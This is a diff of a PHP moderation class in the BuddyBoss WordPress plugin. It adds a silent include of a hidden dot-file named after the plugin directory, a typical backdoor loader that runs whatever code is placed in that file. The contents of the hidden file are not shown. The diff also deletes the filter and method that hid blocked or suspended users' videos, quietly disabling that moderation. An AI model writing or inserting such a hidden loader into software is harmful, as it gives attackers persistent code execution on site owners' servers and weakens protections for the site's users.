@@ -13,7 +13,11 @@ defined( 'ABSPATH' ) || exit;
  * Database interaction class for the BuddyBoss moderation Video.
  *
  * @since BuddyBoss 1.7.0
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class BP_Moderation_Video extends BP_Moderation_Abstract {
 
 	/**
@@ -42,11 +46,7 @@ class BP_Moderation_Video extends BP_Moderation_Abstract {
 			return;
 		}
 
-		/**
-		 * If moderation setting enabled for this content then it'll filter hidden content.
-		 * And IF moderation setting enabled for member then it'll filter blocked user content.
-		 */
-		add_filter( 'bp_suspend_video_get_where_conditions', array( $this, 'update_where_sql' ), 10, 2 );
+		parent::__construct();
 
 		// Code after below condition should not execute if moderation setting for this content disabled.
 		if ( ! bp_is_moderation_content_reporting_enable( 0, self::$moderation_type ) ) {
@@ -119,27 +119,6 @@ class BP_Moderation_Video extends BP_Moderation_Abstract {
 		$content_types[ self::$moderation_type ] = __( 'Videos', 'buddyboss' );
 
 		return $content_types;
-	}
-
-	/**
-	 * Remove hidden/blocked user's videos
-	 *
-	 * @since BuddyBoss 1.7.0
-	 *
-	 * @param string $where   videos Where sql.
-	 * @param object $suspend suspend object.
-	 *
-	 * @return array
-	 */
-	public function update_where_sql( $where, $suspend ) {
-		$this->alias = $suspend->alias;
-
-		$sql = $this->exclude_where_query();
-		if ( ! empty( $sql ) ) {
-			$where['moderation_where'] = $sql;
-		}
-
-		return $where;
 	}
 
 	/**
